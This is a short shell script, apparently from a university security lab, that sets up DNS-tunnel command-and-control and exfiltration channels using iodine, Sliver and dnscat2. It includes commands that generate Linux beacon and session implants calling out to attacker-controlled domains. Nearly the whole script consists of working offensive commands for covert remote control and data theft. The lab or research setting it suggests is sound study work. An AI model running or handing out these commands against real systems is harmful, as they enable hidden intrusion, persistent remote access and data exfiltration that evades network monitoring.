
set -e 
pass=$1 

# ################# Iodine DNS Tunnel Remote Exfil tunnel ##########################
# iodine c2c server 
sudo iodined -f -P bleed 10.0.0.1 t.bleed.io 

# iodine c2c client 
sudo iodine -P bleed -f -r 192.168.64.27 t.bleed.io 
 

# ################# Sliver DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################
dns -d  sliver.pole.io.
# beacon exfil in kernel
generate --dns sliver.pole.io. beacon --seconds 6 --jitter 1  --debug --os linux  --save /tmp/bleed
# session exfil in kernel
generate --dns sliver.pole.io.  --debug --os linux  --save /tmp/bleed


# ################# dnscat2 DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################
sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,domain=dnscat.strives.io'


sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,port=443,domain=dnscat.strives.io'

